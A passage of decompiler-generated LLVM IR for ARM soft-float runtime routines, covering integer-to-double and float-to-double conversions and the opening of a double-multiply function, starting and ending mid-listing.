  %v5_1c5c8 = or i32 %v4_1c5c8, %v3_1c5c8
  store i32 %v5_1c5c8, i32* %r0.global-to-local, align 4
  %v1_1c5cc = and i32 %v3_1c5c8, 1048576
  %v2_1c5cc = icmp eq i32 %v1_1c5cc, 0
  %v0_1c5d0 = load i32, i32* @r4, align 4
  %v1_1c5d0 = add i32 %v0_1c5d0, -1
  store i32 %v1_1c5d0, i32* @r4, align 4
  br i1 %v2_1c5cc, label %bb7, label %dec_label_pc_1c5a8

bb7:                                              ; preds = %dec_label_pc_1c5c0
  ret i32 %v5_1c5c8

; uselistorder directives
  uselistorder i32 %v0_1c5c4, { 1, 2, 0 }
  uselistorder i1 %v1_1c5c0, { 1, 0 }
  uselistorder i32 %v1_1c5ac, { 1, 0 }
  uselistorder i32 %v0_1c5a8, { 1, 0 }
  uselistorder i32 %v0_1c594, { 1, 0, 2 }
  uselistorder i32 %v0_1c590, { 0, 3, 2, 1, 4 }
  uselistorder i32* %r1.global-to-local, { 3, 0, 4, 5, 6, 1, 2 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 0 }
  uselistorder i32 %arg1, { 4, 3, 2, 1, 0, 5 }
  uselistorder label %dec_label_pc_1c5a8._crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_1c5a8, { 0, 2, 1 }
}

define i32 @function_1c5d8(i32 %arg1) local_unnamed_addr {
dec_label_pc_1c5d8:
  %v2_1c5d8 = icmp eq i32 %arg1, 0
  br i1 %v2_1c5d8, label %bb35, label %bb

bb:                                               ; preds = %dec_label_pc_1c5d8
  br label %.thread

bb35:                                             ; preds = %dec_label_pc_1c5d8
  %v1_1c5e410 = load i32, i32* @r1, align 4
  store i32 0, i32* @r1, align 4
  br label %.thread

.thread:                                          ; preds = %bb, %bb35
  %v0_1c640 = phi i32 [ %arg1, %bb ], [ %v1_1c5e410, %bb35 ]
  %v1_1c5f8 = phi i32 [ 20, %bb ], [ 52, %bb35 ]
  %v2_1c5f0 = icmp ugt i32 %v0_1c640, 65535
  br i1 %v2_1c5f0, label %bb36, label %.thread3

bb36:                                             ; preds = %.thread
  %v2_1c5f4 = and i32 %v0_1c640, 32768
  %v3_1c5f4 = icmp eq i32 %v2_1c5f4, 0
  %v4_1c5f4 = udiv i32 %v0_1c640, 65536
  br i1 %v3_1c5f4, label %.thread3, label %bb37

bb37:                                             ; preds = %bb36
  %v2_1c5f8 = add nsw i32 %v1_1c5f8, -16
  br label %.thread3

.thread3:                                         ; preds = %bb36, %.thread, %bb37
  %v1_1c604 = phi i32 [ %v1_1c5f8, %.thread ], [ %v1_1c5f8, %bb36 ], [ %v2_1c5f8, %bb37 ]
  %v1_1c600 = phi i32 [ %v0_1c640, %.thread ], [ %v4_1c5f4, %bb36 ], [ %v4_1c5f4, %bb37 ]
  %v2_1c5fc = icmp ugt i32 %v1_1c600, 255
  br i1 %v2_1c5fc, label %bb38, label %.thread4

bb38:                                             ; preds = %.thread3
  %v2_1c600 = and i32 %v1_1c600, 128
  %v3_1c600 = icmp eq i32 %v2_1c600, 0
  %v4_1c600 = udiv i32 %v1_1c600, 256
  br i1 %v3_1c600, label %.thread4, label %bb39

bb39:                                             ; preds = %bb38
  %v2_1c604 = add nsw i32 %v1_1c604, -8
  br label %.thread4

.thread4:                                         ; preds = %bb38, %.thread3, %bb39
  %v1_1c610 = phi i32 [ %v1_1c604, %.thread3 ], [ %v1_1c604, %bb38 ], [ %v2_1c604, %bb39 ]
  %v1_1c60c = phi i32 [ %v1_1c600, %.thread3 ], [ %v4_1c600, %bb38 ], [ %v4_1c600, %bb39 ]
  %v2_1c608 = icmp ugt i32 %v1_1c60c, 15
  br i1 %v2_1c608, label %bb40, label %.thread5

bb40:                                             ; preds = %.thread4
  %v2_1c60c = and i32 %v1_1c60c, 8
  %v3_1c60c = icmp eq i32 %v2_1c60c, 0
  %v4_1c60c = udiv i32 %v1_1c60c, 16
  br i1 %v3_1c60c, label %.thread5, label %bb41

bb41:                                             ; preds = %bb40
  %v2_1c610 = add nsw i32 %v1_1c610, -4
  br label %.thread5

.thread5:                                         ; preds = %bb40, %.thread4, %bb41
  %v1_1c618 = phi i32 [ %v1_1c610, %.thread4 ], [ %v1_1c610, %bb40 ], [ %v2_1c610, %bb41 ]
  %v1_1c620 = phi i32 [ %v1_1c60c, %.thread4 ], [ %v4_1c60c, %bb40 ], [ %v4_1c60c, %bb41 ]
  %v2_1c614 = icmp ugt i32 %v1_1c620, 3
  br i1 %v2_1c614, label %bb42, label %.thread6

bb42:                                             ; preds = %.thread5
  %v2_1c618 = add i32 %v1_1c618, -2
  br label %bb43

.thread6:                                         ; preds = %.thread5
  %v5_1c61c = udiv i32 %v1_1c620, 2
  %v6_1c61c = sub i32 %v1_1c618, %v5_1c61c
  br label %bb43

bb43:                                             ; preds = %bb42, %.thread6
  %v0_1c620 = phi i32 [ %v6_1c61c, %.thread6 ], [ %v2_1c618, %bb42 ]
  %v4_1c620 = udiv i32 %v1_1c620, 8
  %v5_1c620 = sub i32 %v0_1c620, %v4_1c620
  %v2_1c624 = add i32 %v5_1c620, -32
  %v4_1c624 = sub i32 31, %v5_1c620
  %v5_1c624 = and i32 %v4_1c624, %v5_1c620
  %v8_1c624 = icmp eq i32 %v5_1c620, 32
  %v6_1c628 = icmp slt i32 %v5_1c620, 32
  br i1 %v6_1c628, label %dec_label_pc_1c62c, label %dec_label_pc_1c64c

dec_label_pc_1c62c:                               ; preds = %bb43
  %v2_1c62c = add i32 %v5_1c620, -20
  %v7_1c630 = icmp sgt i32 %v2_1c624, -12
  br i1 %v7_1c630, label %dec_label_pc_1c634, label %dec_label_pc_1c648

dec_label_pc_1c634:                               ; preds = %dec_label_pc_1c62c
  %v1_1c638 = sub i32 32, %v5_1c620
  %v6_1c63c = shl i32 %v0_1c640, %v5_1c620
  store i32 %v6_1c63c, i32* @r1, align 4
  %v6_1c640 = lshr i32 %v0_1c640, %v1_1c638
  br label %.thread31

dec_label_pc_1c648:                               ; preds = %dec_label_pc_1c62c
  %v8_1c62c = icmp eq i32 %v2_1c62c, 0
  %v4_1c62c = add i32 %v5_1c620, 2147483616
  %v5_1c62c = and i32 %v2_1c62c, %v4_1c62c
  br label %dec_label_pc_1c64c

dec_label_pc_1c64c:                               ; preds = %bb43, %dec_label_pc_1c648
  %v1_1c658.in = phi i32 [ %v2_1c624, %bb43 ], [ %v2_1c62c, %dec_label_pc_1c648 ]
  %v6_1c658 = phi i32 [ %v2_1c624, %bb43 ], [ %v5_1c620, %dec_label_pc_1c648 ]
  %v2_1c658.in = phi i32 [ %v5_1c624, %bb43 ], [ %v5_1c62c, %dec_label_pc_1c648 ]
  %v0_1c658 = phi i1 [ %v8_1c624, %bb43 ], [ %v8_1c62c, %dec_label_pc_1c648 ]
  %v1_1c658 = icmp slt i32 %v1_1c658.in, 0
  %v2_1c658 = icmp slt i32 %v2_1c658.in, 0
  %v3_1c64c = xor i1 %v2_1c658, %v1_1c658
  %v4_1c64c = or i1 %v0_1c658, %v3_1c64c
  br i1 %v4_1c64c, label %bb44, label %bb45

bb44:                                             ; preds = %dec_label_pc_1c64c
  %v6_1c64c = sub i32 32, %v6_1c658
  store i32 %v6_1c64c, i32* @ip, align 4
  br label %bb45

bb45:                                             ; preds = %dec_label_pc_1c64c, %bb44
  %v6_1c650 = shl i32 %v0_1c640, %v6_1c658
  br i1 %v4_1c64c, label %bb46, label %.thread31

bb46:                                             ; preds = %bb45
  %v6_1c654 = load i32, i32* @r1, align 4
  %v7_1c654 = load i32, i32* @ip, align 4
  %v12_1c654 = lshr i32 %v6_1c654, %v7_1c654
  %v13_1c654 = or i32 %v12_1c654, %v6_1c650
  %v11_1c658 = shl i32 %v6_1c654, %v6_1c658
  store i32 %v11_1c658, i32* @r1, align 4
  br label %.thread31

.thread31:                                        ; preds = %bb45, %dec_label_pc_1c634, %bb46
  %v1_1c6a4 = phi i32 [ %v6_1c640, %dec_label_pc_1c634 ], [ %v13_1c654, %bb46 ], [ %v6_1c650, %bb45 ]
  %v0_1c65c = load i32, i32* @r4, align 4
  %v2_1c65c = sub i32 %v0_1c65c, %v5_1c620
  %v5_1c660 = icmp slt i32 %v0_1c65c, %v5_1c620
  br i1 %v5_1c660, label %bb48, label %bb47

bb47:                                             ; preds = %.thread31
  %v10_1c660 = mul i32 %v2_1c65c, 1048576
  %v11_1c660 = add i32 %v10_1c660, %v1_1c6a4
  %v7_1c664 = load i32, i32* @r5, align 4
  %v8_1c664 = or i32 %v7_1c664, %v11_1c660
  ret i32 %v8_1c664

bb48:                                             ; preds = %.thread31
  %v2_1c670 = sub i32 -32, %v2_1c65c
  %v6_1c674 = icmp sgt i32 %v2_1c65c, -32
  br i1 %v6_1c674, label %dec_label_pc_1c678, label %dec_label_pc_1c6b0

dec_label_pc_1c678:                               ; preds = %bb48
  %v1_1c678 = add i32 %v2_1c670, 12
  %v8_1c67c = icmp sgt i32 %v1_1c678, 0
  br i1 %v8_1c67c, label %dec_label_pc_1c698, label %dec_label_pc_1c680

dec_label_pc_1c680:                               ; preds = %dec_label_pc_1c678
  %v1_1c680 = add i32 %v2_1c670, 32
  %v0_1c690 = load i32, i32* @r5, align 4
  %v7_1c690 = lshr i32 %v1_1c6a4, %v1_1c680
  %v8_1c690 = or i32 %v0_1c690, %v7_1c690
  ret i32 %v8_1c690

dec_label_pc_1c698:                               ; preds = %dec_label_pc_1c678
  %v0_1c6a8 = load i32, i32* @r5, align 4
  ret i32 %v0_1c6a8

dec_label_pc_1c6b0:                               ; preds = %bb48
  %v0_1c6b4 = load i32, i32* @r5, align 4
  ret i32 %v0_1c6b4

; uselistorder directives
  uselistorder i32 %v2_1c65c, { 1, 0, 2 }
  uselistorder i32 %v1_1c6a4, { 1, 0 }
  uselistorder i32 %v6_1c650, { 1, 0 }
  uselistorder i32 %v2_1c624, { 1, 0, 2 }
  uselistorder i32 %v5_1c620, { 5, 4, 6, 2, 7, 1, 3, 8, 9, 0, 11, 10 }
  uselistorder i32 %v4_1c60c, { 1, 0 }
  uselistorder i32 %v1_1c60c, { 1, 0, 2, 3 }
  uselistorder i32 %v4_1c600, { 1, 0 }
  uselistorder i32 %v1_1c600, { 1, 0, 2, 3 }
  uselistorder i32 %v4_1c5f4, { 1, 0 }
  uselistorder i32 %v0_1c640, { 3, 1, 2, 4, 0, 5, 6 }
  uselistorder i32 -12, { 0, 1, 13, 14, 2, 16, 17, 3, 18, 19, 15, 12, 11, 10, 9, 8, 20, 21, 22, 4, 5, 6, 23, 7, 24, 25, 27, 28, 29, 26 }
  uselistorder i32 -20, { 0, 2, 1 }
  uselistorder i32 -2, { 13, 0, 8, 3, 5, 6, 4, 14, 9, 7, 12, 10, 15, 17, 16, 18, 1, 2, 11, 19 }
  uselistorder i32 15, { 5, 6, 7, 4, 10, 11, 3, 9, 12, 2, 13, 0, 8, 1 }
  uselistorder i32 -8, { 6, 30, 13, 14, 15, 16, 17, 18, 12, 11, 4, 10, 9, 8, 7, 19, 20, 21, 22, 5, 23, 24, 2, 0, 28, 25, 26, 27, 1, 31, 32, 3, 29 }
  uselistorder i32 128, { 13, 14, 15, 7, 8, 9, 11, 6, 23, 0, 28, 1, 22, 21, 10, 24, 25, 2, 3, 12, 26, 27, 4, 18, 29, 30, 20, 19, 16, 17, 5 }
  uselistorder i32 255, { 4, 5, 6, 10, 1, 2, 7, 3, 8, 9, 0 }
  uselistorder i32 -16, { 3, 8, 9, 10, 11, 12, 13, 14, 15, 16, 7, 6, 5, 1, 17, 18, 19, 20, 21, 22, 4, 2, 0, 23 }
  uselistorder i32 65535, { 1, 2, 3, 0 }
  uselistorder i32 52, { 0, 10, 11, 1, 12, 8, 6, 3, 9, 7, 4, 5, 2 }
  uselistorder i32 20, { 4, 9, 72, 62, 63, 64, 5, 34, 6, 73, 1, 65, 0, 74, 10, 56, 75, 23, 24, 25, 26, 27, 28, 29, 30, 76, 35, 36, 37, 11, 38, 39, 40, 41, 31, 12, 42, 43, 44, 45, 46, 79, 7, 80, 2, 8, 66, 13, 77, 78, 47, 60, 48, 14, 3, 15, 68, 69, 70, 71, 49, 67, 57, 50, 51, 52, 53, 54, 55, 61, 81, 17, 18, 19, 20, 21, 22, 58, 32, 33, 59, 16 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %.thread31, { 2, 0, 1 }
  uselistorder label %bb45, { 1, 0 }
  uselistorder label %dec_label_pc_1c64c, { 1, 0 }
  uselistorder label %bb43, { 1, 0 }
  uselistorder label %.thread5, { 2, 0, 1 }
  uselistorder label %.thread4, { 2, 0, 1 }
  uselistorder label %.thread3, { 2, 0, 1 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @function_1c6bc(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
dec_label_pc_1c6bc:
  store i32 %arg4, i32* @r3, align 4
  store i32 %arg2, i32* @r1, align 4
  store i32 %arg1, i32* @r0, align 4
  %v0_1c6bc = load i32, i32* @r4, align 4
  %v2_1c6bc = icmp eq i32 %v0_1c6bc, 0
  %v1_1c6c0 = xor i32 %arg3, 1048576
  store i32 %v1_1c6c0, i32* @r2, align 4
  br i1 %v2_1c6bc, label %.thread, label %.thread1

.thread:                                          ; preds = %dec_label_pc_1c6bc
  %v2_1c6c4 = xor i32 %arg1, 1048576
  store i32 %v2_1c6c4, i32* @r0, align 4
  store i32 1, i32* @r4, align 4
  br label %bb

.thread1:                                         ; preds = %dec_label_pc_1c6bc
  %v1_1c6cc = load i32, i32* @r5, align 4
  %v2_1c6cc = add i32 %v1_1c6cc, -1
  store i32 %v2_1c6cc, i32* @r5, align 4
  br label %bb

bb:                                               ; preds = %.thread, %.thread1
  %v0_1c6d0 = call i32 @function_1c528()
  %v0_1c6d4 = load i32, i32* @r4, align 4
  %v0_1c6d4.off = add i32 %v0_1c6d4, 4194303
  %tmp = icmp ult i32 %v0_1c6d4.off, 2097152
  %v1_1c750 = load i32, i32* @r5, align 4
  %v1_1c750.off = add i32 %v1_1c750, 4194303
  %tmp45 = icmp ult i32 %v1_1c750.off, 2097152
  br i1 %tmp, label %.thread11, label %bb33

bb33:                                             ; preds = %bb
  br i1 %tmp45, label %bb40, label %dec_label_pc_1c6e0

dec_label_pc_1c6e0:                               ; preds = %bb33
  %v4_1c6e0 = icmp eq i32 %v1_1c750, %v0_1c6d4
  %v1_1c6e4 = load i32, i32* @r1, align 4
  br i1 %v4_1c6e0, label %bb34, label %dec_label_pc_1c6ec

bb34:                                             ; preds = %dec_label_pc_1c6e0
  %v2_1c6e4 = load i32, i32* @r3, align 4
  %v5_1c6e4 = icmp eq i32 %v2_1c6e4, %v1_1c6e4
  br i1 %v5_1c6e4, label %dec_label_pc_1c6fc, label %dec_label_pc_1c6ec

dec_label_pc_1c6ec:                               ; preds = %dec_label_pc_1c6e0, %bb34
  %v2_1c6ec = or i32 %v1_1c6e4, %v0_1c6d4
  %v4_1c6ec = icmp eq i32 %v2_1c6ec, 0
  br i1 %v4_1c6ec, label %bb35, label %.thread6

bb35:                                             ; preds = %dec_label_pc_1c6ec
  %v1_1c6f0 = load i32, i32* @r2, align 4
  br label %.thread6

.thread6:                                         ; preds = %dec_label_pc_1c6ec, %bb35
  %v11_1c6f8 = phi i32 [ %v0_1c6d0, %dec_label_pc_1c6ec ], [ %v1_1c6f0, %bb35 ]
  ret i32 %v11_1c6f8

dec_label_pc_1c6fc:                               ; preds = %bb34
  %v1_1c6fc = load i32, i32* @r2, align 4
  %v4_1c6fc = icmp eq i32 %v1_1c6fc, %v0_1c6d0
  br i1 %v4_1c6fc, label %.thread8, label %bb36

bb36:                                             ; preds = %dec_label_pc_1c6fc
  ret i32 0

.thread8:                                         ; preds = %dec_label_pc_1c6fc
  %tmp46 = icmp ult i32 %v0_1c6d4, 2097152
  br i1 %tmp46, label %dec_label_pc_1c714, label %dec_label_pc_1c724

dec_label_pc_1c714:                               ; preds = %.thread8
  %v1_1c714 = icmp slt i32 %v1_1c6e4, 0
  %v3_1c718 = mul i32 %v0_1c6d0, 2
  %v4_1c718 = zext i1 %v1_1c714 to i32
  %v5_1c718 = or i32 %v4_1c718, %v3_1c718
  %v9_1c718 = icmp ule i32 %v5_1c718, %v0_1c6d0
  %v10_1c718 = icmp ult i32 %v3_1c718, %v0_1c6d0
  %v11_1c718 = select i1 %v1_1c714, i1 %v9_1c718, i1 %v10_1c718
  br i1 %v11_1c718, label %bb37, label %bb38

bb37:                                             ; preds = %dec_label_pc_1c714
  %v2_1c71c = or i32 %v5_1c718, -2147483648
  br label %bb38

bb38:                                             ; preds = %dec_label_pc_1c714, %bb37
  %v11_1c720 = phi i32 [ %v5_1c718, %dec_label_pc_1c714 ], [ %v2_1c71c, %bb37 ]
  ret i32 %v11_1c720

dec_label_pc_1c724:                               ; preds = %.thread8
  %v2_1c724 = icmp ugt i32 %v0_1c6d4, -4194305
  br i1 %v2_1c724, label %.thread9, label %bb39

bb39:                                             ; preds = %dec_label_pc_1c724
  %v2_1c728 = add i32 %v0_1c6d0, 1048576
  ret i32 %v2_1c728

.thread9:                                         ; preds = %dec_label_pc_1c724
  %v1_1c730 = and i32 %v0_1c6d0, -2147483648
  %v1_1c738 = or i32 %v1_1c730, 2146435072
  ret i32 %v1_1c738

.thread11:                                        ; preds = %bb
  br i1 %tmp45, label %.thread11..thread13_crit_edge, label %.thread14

.thread11..thread13_crit_edge:                    ; preds = %.thread11
  %v0_1c75c.pre = load i32, i32* @r1, align 4
  br label %.thread13

.thread14:                                        ; preds = %.thread11
  store i32 %v0_1c6d0, i32* @r2, align 4
  br label %bb41

bb40:                                             ; preds = %bb33
  %v1_1c748 = load i32, i32* @r2, align 4
  br label %bb41

bb41:                                             ; preds = %bb40, %.thread14
  %v1_1c75c27 = phi i32 [ %v0_1c6d0, %.thread14 ], [ %v1_1c748, %bb40 ]
  %v1_1c758.in = phi i32* [ @r1, %.thread14 ], [ @r3, %bb40 ]
  %v1_1c758 = load i32, i32* %v1_1c758.in, align 4
  store i32 %v1_1c758, i32* @r3, align 4
  br label %.thread13

.thread13:                                        ; preds = %.thread11..thread13_crit_edge, %bb41
  %v1_1c768 = phi i32 [ %v0_1c6d0, %.thread11..thread13_crit_edge ], [ %v1_1c75c27, %bb41 ]
  %v0_1c75c = phi i32 [ %v0_1c75c.pre, %.thread11..thread13_crit_edge ], [ %v1_1c758, %bb41 ]
  %v4_1c75c = mul i32 %v1_1c768, 4096
  %v5_1c75c = or i32 %v4_1c75c, %v0_1c75c
  %v7_1c75c = icmp eq i32 %v5_1c75c, 0
  br i1 %v7_1c75c, label %bb42, label %.thread17

bb42:                                             ; preds = %.thread13
  %v1_1c760 = load i32, i32* @r3, align 4
  %v2_1c760 = load i32, i32* @r2, align 4
  %v5_1c760 = mul i32 %v2_1c760, 4096
  %v6_1c760 = or i32 %v5_1c760, %v1_1c760
  %v8_1c760 = icmp eq i32 %v6_1c760, 0
  br i1 %v8_1c760, label %bb43, label %.thread17

bb43:                                             ; preds = %bb42
  %v5_1c764 = icmp eq i32 %v2_1c760, %v1_1c768
  br i1 %v5_1c764, label %bb44, label %.thread17

.thread17:                                        ; preds = %.thread13, %bb42, %bb43
  %v2_1c768 = or i32 %v1_1c768, 524288
  br label %bb44

bb44:                                             ; preds = %bb43, %.thread17
  %v11_1c76c = phi i32 [ %v1_1c768, %bb43 ], [ %v2_1c768, %.thread17 ]
  ret i32 %v11_1c76c

; uselistorder directives
  uselistorder i32 %v1_1c768, { 2, 3, 0, 1 }
  uselistorder i32 %v1_1c758, { 1, 0 }
  uselistorder i1 %v1_1c714, { 1, 0 }
  uselistorder i32 %v1_1c6e4, { 2, 1, 0 }
  uselistorder i32 %v0_1c6d4, { 4, 1, 3, 0, 2 }
  uselistorder i32 %v0_1c6d0, { 3, 4, 2, 5, 6, 7, 8, 1, 0, 9 }
  uselistorder label %bb44, { 1, 0 }
  uselistorder label %.thread17, { 2, 1, 0 }
  uselistorder label %.thread13, { 1, 0 }
  uselistorder label %bb38, { 1, 0 }
  uselistorder label %.thread6, { 1, 0 }
  uselistorder label %dec_label_pc_1c6ec, { 1, 0 }
  uselistorder label %bb, { 1, 0 }
}

define i32 @__aeabi_ui2d(i32 %arg1) local_unnamed_addr {
entry:
  %v2_1c770 = icmp eq i32 %arg1, 0
  br i1 %v2_1c770, label %bb, label %.thread

bb:                                               ; preds = %entry
  ret i32 0

.thread:                                          ; preds = %entry
  store i32 1074, i32* @r4, align 4
  store i32 0, i32* @r5, align 4
  store i32 %arg1, i32* @r1, align 4
  %v1_1c794 = call i32 @function_1c5d8(i32 0)
  ret i32 %v1_1c794
}

define i32 @__floatsidf(i32 %arg1) local_unnamed_addr {
entry:
  %v2_1c798 = icmp eq i32 %arg1, 0
  br i1 %v2_1c798, label %bb, label %.thread

bb:                                               ; preds = %entry
  ret i32 0

.thread:                                          ; preds = %entry
  store i32 1074, i32* @r4, align 4
  %v1_1c7b0 = and i32 %arg1, -2147483648
  store i32 %v1_1c7b0, i32* @r5, align 4
  %v2_1c7b0 = icmp eq i32 %v1_1c7b0, 0
  br i1 %v2_1c7b0, label %bb5, label %bb4

bb4:                                              ; preds = %.thread
  %v2_1c7b4 = sub i32 0, %arg1
  br label %bb5

bb5:                                              ; preds = %.thread, %bb4
  %v0_1c7b8 = phi i32 [ %arg1, %.thread ], [ %v2_1c7b4, %bb4 ]
  store i32 %v0_1c7b8, i32* @r1, align 4
  %v1_1c7c0 = call i32 @function_1c5d8(i32 0)
  ret i32 %v1_1c7c0

; uselistorder directives
  uselistorder i32 %arg1, { 3, 2, 1, 0 }
  uselistorder label %bb5, { 1, 0 }
}

define i32 @__extendsfdf2(i32 %arg1) local_unnamed_addr {
entry:
  %v2_1c7c4 = mul i32 %arg1, 2
  %v4_1c7c4 = icmp eq i32 %v2_1c7c4, 0
  %v1_1c7c8 = and i32 %v2_1c7c4, 4
  %v2_1c7c8 = icmp ne i32 %v1_1c7c8, 0
  %v3_1c7c8 = sdiv i32 %v2_1c7c4, 8
  %v3_1c7cc = zext i1 %v2_1c7c8 to i32
  %v6_1c7cc = zext i32 %v3_1c7c8 to i64
  %v7_1c7cc = sub nsw i32 33, %v3_1c7c8
  %v8_1c7cc = zext i32 %v7_1c7cc to i64
  %v9_1c7cc = shl i64 %v6_1c7cc, %v8_1c7cc
  %v10_1c7cc = sub nsw i32 32, %v3_1c7c8
  %v11_1c7cc = shl i32 %v3_1c7cc, %v10_1c7cc
  %v12_1c7cc = zext i32 %v11_1c7cc to i64
  %v14_1c7cc = or i64 %v12_1c7cc, %v9_1c7cc
  %v15_1c7cc = trunc i64 %v14_1c7cc to i32
  %v3_1c7d0 = mul i32 %arg1, 536870912
  store i32 %v3_1c7d0, i32* @r1, align 4
  br i1 %v4_1c7c4, label %.thread2, label %bb

bb:                                               ; preds = %entry
  %v4_1c7d4 = icmp ult i32 %v2_1c7c4, 16777216
  br i1 %v4_1c7d4, label %bb12, label %bb9

bb9:                                              ; preds = %bb
  %v4_1c7e818 = icmp ugt i32 %v2_1c7c4, -16777217
  br i1 %v4_1c7e818, label %bb11.thread, label %bb10

bb11.thread:                                      ; preds = %bb9
  br label %.thread3

bb10:                                             ; preds = %bb9
  %v2_1c7dc6 = xor i32 %v15_1c7cc, 939524096
  ret i32 %v2_1c7dc6

.thread2:                                         ; preds = %entry
  br label %.thread3

.thread3:                                         ; preds = %bb11.thread, %.thread2
  ret i32 %v15_1c7cc

bb12:                                             ; preds = %bb
  store i32 896, i32* @r4, align 4
  %v1_1c7f8 = and i32 %v15_1c7cc, -2147483648
  store i32 %v1_1c7f8, i32* @r5, align 4
  %tmp = bitcast i32 %v15_1c7cc to float
  %tmp19 = call float @fabsf(float %tmp)
  %v1_1c7fc = bitcast float %tmp19 to i32
  %v1_1c800 = call i32 @function_1c5d8(i32 %v1_1c7fc)
  ret i32 %v1_1c800

; uselistorder directives
  uselistorder i32 %v15_1c7cc, { 0, 2, 1, 3 }
  uselistorder i32 %v3_1c7c8, { 1, 2, 0 }
  uselistorder i32 %v2_1c7c4, { 1, 0, 4, 3, 2 }
  uselistorder i32 (i32)* @function_1c5d8, { 2, 0, 1 }
  uselistorder label %.thread3, { 1, 0 }
}

define i32 @__aeabi_ul2d(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg2, i32* @r1, align 4
  store i32 %arg1, i32* @r0, align 4
  %v2_1c804 = or i32 %arg2, %arg1
  %v4_1c804 = icmp eq i32 %v2_1c804, 0
  br i1 %v4_1c804, label %bb, label %bb3

bb:                                               ; preds = %entry
  ret i32 %arg1

bb3:                                              ; preds = %entry
  store i32 0, i32* @r5, align 4
  %v0_1c814 = call i32 @function_1c834()
  ret i32 %v0_1c814

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
}

define i32 @__floatdidf(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v2_1c818 = or i32 %arg2, %arg1
  %v4_1c818 = icmp eq i32 %v2_1c818, 0
  br i1 %v4_1c818, label %bb, label %bb3

bb:                                               ; preds = %entry
  ret i32 %arg1

bb3:                                              ; preds = %entry
  %v1_1c828 = icmp sgt i32 %arg2, -1
  call void @__pseudo_cond_branch(i1 %v1_1c828, i32 ptrtoint (i32* @global_var_1c834.1097 to i32))
  %v1_1c82c = sub i32 0, %arg1
  ret i32 %v1_1c82c

; uselistorder directives
  uselistorder i32 %arg1, { 1, 2, 0 }
}

define i32 @function_1c834() local_unnamed_addr {
dec_label_pc_1c834:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 1074, i32* %r4.global-to-local, align 4
  %v0_1c83c = load i32, i32* @r0, align 4
  %v0_1c840 = load i32, i32* @r1, align 4
  store i32 %v0_1c840, i32* %r0.global-to-local, align 4
  store i32 %v0_1c83c, i32* %r1.global-to-local, align 4
  %tmp = icmp ult i32 %v0_1c840, 4194304
  call void @__pseudo_cond_branch(i1 %tmp, i32 ptrtoint (i32* @global_var_1c57c.1095 to i32))
  %tmp6 = icmp ult i32 %v0_1c840, 33554432
  br i1 %tmp6, label %bb3, label %bb

bb:                                               ; preds = %dec_label_pc_1c834
  br label %bb3

bb3:                                              ; preds = %dec_label_pc_1c834, %bb
  %v1_1c860 = phi i32 [ 3, %dec_label_pc_1c834 ], [ 6, %bb ]
  %tmp7 = icmp ult i32 %v0_1c840, 268435456
  br i1 %tmp7, label %bb5, label %bb4

bb4:                                              ; preds = %bb3
  %v2_1c860 = add nuw nsw i32 %v1_1c860, 3
  br label %bb5

bb5:                                              ; preds = %bb3, %bb4
  %v0_1c864 = phi i32 [ %v1_1c860, %bb3 ], [ %v2_1c860, %bb4 ]
  %not. = icmp slt i32 %v0_1c840, 0
  %v4_1c864 = zext i1 %not. to i32
  %v5_1c864 = add nsw i32 %v0_1c864, %v4_1c864
  %v1_1c868 = sub nsw i32 32, %v5_1c864
  %v0_1c86c = load i32, i32* %r1.global-to-local, align 4
  %v6_1c86c = shl i32 %v0_1c86c, %v1_1c868
  store i32 %v6_1c86c, i32* @ip, align 4
  %v6_1c870 = lshr i32 %v0_1c86c, %v5_1c864
  %v1_1c874 = load i32, i32* %r0.global-to-local, align 4
  %v7_1c874 = shl i32 %v1_1c874, %v1_1c868
  %v8_1c874 = or i32 %v7_1c874, %v6_1c870
  store i32 %v8_1c874, i32* %r1.global-to-local, align 4
  %v6_1c878 = lshr i32 %v1_1c874, %v5_1c864
  store i32 %v6_1c878, i32* %r0.global-to-local, align 4
  %v0_1c87c = load i32, i32* %r4.global-to-local, align 4
  %v2_1c87c = add i32 %v0_1c87c, %v5_1c864
  store i32 %v2_1c87c, i32* @r4, align 4
  %v4_1c880 = sext i32 %v8_1c874 to i64
  %v5_1c880 = call i32 @function_1c57c(i32 %v6_1c878, i64 %v4_1c880, i32 %v5_1c864, i32 %v1_1c868)
  store i32 %v5_1c880, i32* %r0.global-to-local, align 4
  ret i32 %v5_1c880

; uselistorder directives
  uselistorder i32 %v5_1c864, { 2, 0, 1, 3, 4 }
  uselistorder i32 6, { 1, 10, 18, 19, 20, 12, 13, 14, 15, 3, 2, 16, 4, 11, 17, 5, 21, 22, 6, 7, 24, 8, 9, 23, 0 }
  uselistorder i32 3, { 70, 23, 56, 57, 30, 94, 58, 95, 59, 48, 19, 34, 35, 87, 31, 88, 89, 32, 90, 109, 99, 91, 20, 100, 0, 71, 72, 73, 101, 102, 37, 36, 60, 3, 2, 1, 4, 92, 38, 74, 49, 103, 104, 28, 27, 105, 106, 107, 108, 5, 6, 21, 7, 8, 61, 62, 112, 63, 64, 65, 66, 67, 68, 96, 17, 39, 97, 40, 75, 41, 76, 42, 77, 43, 78, 44, 79, 18, 80, 113, 24, 85, 110, 111, 22, 93, 98, 9, 10, 11, 50, 51, 86, 52, 53, 114, 45, 54, 81, 25, 26, 115, 82, 83, 12, 84, 13, 14, 15, 46, 16, 55, 69, 33, 47, 29 }
  uselistorder label %bb5, { 1, 0 }
  uselistorder label %bb3, { 1, 0 }
}

define i32 @__aeabi_dmul(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
